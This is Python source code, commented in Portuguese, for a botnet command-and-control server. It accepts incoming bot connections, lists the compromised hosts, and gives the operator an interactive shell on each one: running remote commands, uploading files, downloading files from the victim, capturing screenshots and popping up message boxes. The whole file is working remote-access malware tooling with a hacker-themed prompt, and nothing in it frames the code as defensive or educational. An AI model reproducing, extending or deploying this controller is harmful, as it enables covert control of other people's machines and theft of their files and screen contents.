# GNU General Public License v3.0
#
# Permissions of this strong copyleft license are conditioned on making
# available complete source code of licensed works and modifications,
# which include larger works using a licensed work, under the same license.
# Copyright and license notices must be preserved. Contributors provide an express grant of patent rights.
#
#
from dependencies.helper import uuid, banner, local_help, save_in_disc, Color, is_option, send_file
from dependencies.banners import planets, all_banners
import socket
import threading
import os
import time
import sys
import random
import logging


# __init__(self, int port=443) : None
# inicializar o socket
#
# __recv(self, socket sock) : bytes
# implementação do socket.recv - recebe dados de qualquer tamanho
#
# __listen(self) : None
# escuta novas conexões, cria thread da conexão e
# adiciona a lista de conexões ativas com um uid
#
# listen_to_bot(self, socket con, tuple addr, str uid) : None
# ativa comunicação com o bot (até antes a conexão fica em sleep)
#
# prompt(self) : None
# básico "bash" de comandos
#
# list_current_bots(self) : None
# listagem de bots conectados
#
# listen(self) : None
# função "main", escuta conexões chamando __listen(self)
# e inicia aguarda comandos (prompt(self))
##
# uma expressão programática da minha vontade
#
# class: handler de conexão
class ManageBots():
	__connections = dict()	# guarda conexões ativas
	# se um thread estiver ativo (comunicação com bot) está variável
	# será true impedindo que o "bash" seja exibido
	__current_thread = None

	def __init__(self, port=8080):
		self.port = port
		self.hostname = '0.0.0.0'  # socket.gethostname()
		self.sockt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sockt.bind((self.hostname, self.port))

	r"""implementação do recv do socket.

		:param sock: socket para escutar dados :class:`socket` object.
		:return: :class:`bytes <bytes>` object
		:rtype: bytes
	"""
	def __recv(self, sock):
		buff_size, data = 4096, b''
		while True:
			part = sock.recv(buff_size)
			data += part
			if len(part) < buff_size:
				break
		return data

	r"""comunicação ativa com bot.

		:param con: socket aberto :class:`socket` object.
		:param addr: tuple (ip, port) :class:`tuple` object.
		:param uid: identificador unico gerado ao receber comunicação
			:class:`str` object.
	"""
	def listen_to_bot(self, con, addr, uid):
		print(Color.s('\n{G} connection from{W} %s' % str(addr)))

		while True:
			command = input(Color.s(' [{P}your{W}] for {O}%s{W} ~> ' % str(addr)))
			save_in_disc(f'sys: {command}', uid, addr)
			if is_option(command, con):
				break
			elif 'isys:' in command:
				os.system(command.replace('isys:', ''))
			elif '__help' in command:
				local_help()
			elif '__message_box' in command:
				con.sendall(command.encode())
			elif '__send_file' in command:
				path_file = input(Color.s(' [{P}choice path file{W}] ~> '))
				if os.path.isfile(path_file):
					send_file(con, path_file)
					recv_mesg = self.__recv(con)
					print(Color.s('{!}{B} response: %s' % recv_mesg.decode()))
				else:
					print(Color.s('{!}{R} path not found!{W}'))
			elif '__recv_file' in command:
				path_file = input(Color.s(' [{P}path file{W}] ~> '))
				con.send(f'__send_file<>{path_file}'.encode())
				recv_mesg = self.__recv(con)
				if 'not found' in recv_mesg.decode():
					print(Color.s('{!}{R} file not found!{W}'))
				else:
					recv_mesg = self.__recv(con)
					filename = path_file.split('\\')[-1]
					handler = open(filename, 'wb')
					handler.write(recv_mesg)
					handler.close()
					print(Color.s('{!}{B} recv: ' + str(os.path.getsize(filename)) + ' bytes. {W}'))
			elif '__sleep' in command:
				con.send(command.encode())
				recv_mesg = self.__recv(con)
				print(Color.s(' {P}%s{W}' % recv_mesg.decode()))
			elif '__screenshot' in command:
				con.send('__screenshot'.encode())
				recv_mesg = self.__recv(con)
				recv_mesg = recv_mesg.decode().split(':')
				if recv_mesg[0] == 'ok':
					screen_bytes = self.__recv(con)
					screen = open(recv_mesg[1], 'wb')
					screen.write(screen_bytes)
					screen.close()
					print(Color.s('{+} {G} file: %s.{W}' % recv_mesg[1]))
				else:
					print(Color.s('{!} {R}erro ao tirar screenshort.{W}'))
			else:
				if command != '':
					con.sendall(command.encode())
				else:
					con.sendall('whoami'.encode())
				recv_mesg = self.__recv(con)
				if not recv_mesg: break
				recv_mesg = recv_mesg.decode('utf-8', errors='replace')
				save_in_disc(f'bot: {recv_mesg}', uid, addr)
				# resposta do bot
				print(Color.s(' [{B}bot{W}] [{B}%s{W}] {O}%s{W} \n{G}%s{W}'
					% (uid, str(addr), recv_mesg)))

		logging.info(f'close: [{uid}][{addr[0]}:{addr[1]}]')
		self.__connections.pop(uid)  # remover da lista de conexões ativas
		self.__current_thread = None  # permitir exibição do "bash"
		print(Color.s('{!} {O}%s {R}disconnected.{W}\n\n' % str(addr)))
		self.list_current_bots()  # listar conexões ativas

	r"""aceita conexões de forma assíncrona.
		:return: :class:`None <None>` object
		:rtype: None
	"""
	def __listen(self):
		while True:
			con, addr = self.sockt.accept()
			uuid_con = uuid()
			logging.info(f'_open: [{uuid_con}][{addr[0]}:{addr[1]}]')
			# cria processo (socket com bot) mas não dá start
			process = threading.Thread(target=self.listen_to_bot, args=(con, addr, uuid_con))
			# adiciona a lista de conexões ativas
			self.__connections[uuid_con] = {'thread': process, 'addr': addr}

	r"""interação do administrador com bot via bash
		:return: :class:`None <None>` object
		:rtype: None
	"""
	def prompt(self):
		while self.__current_thread is None:
			try:
				command = input(' [ekaxis@fsociet]$ ')
			except:
				time.sleep(5)
				continue
			if command == 'list':
				self.list_current_bots()
			if command == 'help':
				local_help()
			if command == 'sys.exit':
				sys.exit(0)
			elif 'sys:' in command:
				os.system(command.replace('sys:', ''))

	r"""cria thread para escutar conexões.
	:return: :class:`None <None> object
	:rtype: None
	"""
	def listen(self):
		logging.info(f'started server...')
		print(Color.s('\n{+} {W}[{G}%s{W}:{P}%s{W}] {C}listen connection...{W}' % (self.hostname, str(self.port))), end="\n\n")
		self.sockt.listen(5)

		# print(Color.s('{!} {C}you have {R}no{C} bot connected{W} :/'), end="\n\n")
		threading.Thread(target=self.__listen, args=()).start()

		while True:
			self.prompt()
			# sem isso aqui o "bash" é chamado antes de encerrar a conexão
			temp_thread = threading.Thread(target=lambda: time.sleep(5))
			temp_thread.start()
			temp_thread.join()

	def list_current_bots(self):
		if len(self.__connections) == 0:
			print(Color.s('{!} {O}there are no bots currently connected, {B}please wait for a connection{W}. :/'))
		else:
			print()
			for bot in self.__connections:
				conn = self.__connections[bot]
				print(Color.s(' {B}uid{W}: {O}%s\n\t {B}address{W}: {O}%s{W}'
					% (bot, str(conn['addr']))))
			see = input(Color.s('\n{?} {G}do you want to connect to any bot?{W} ({G}s{W}/{R}N{W}): '))
			if see == 's':
				uid = input(Color.s(' [{O}*{W}] {G}uid:{W} '))
				for bot in self.__connections:
					if bot == uid:
						self.__connections[bot]['thread'].start()
						self.__current_thread = self.__connections[bot]['thread']
						break
			else:
				pass


if __name__ == '__main__':
	logging.basicConfig(level=logging.DEBUG, filename='bots.log',
		format='[%(asctime)s] -- %(levelname)s -- %(message)s', filemode='a+', datefmt='%m/%d/%Y %H:%I:%M')
	os.system('clear')
	# print(Color.s(planets()))
	f_banners = all_banners()
	number = random.randint(0, len(f_banners) - 1)
	print(Color.s('{R}' + f_banners[number] + '{W}'))
	try:
		ManageBots().listen()
	except KeyboardInterrupt:
		sys.stdout.write('\r bye bye friend...\n\n')
		logging.info(f'close server.')
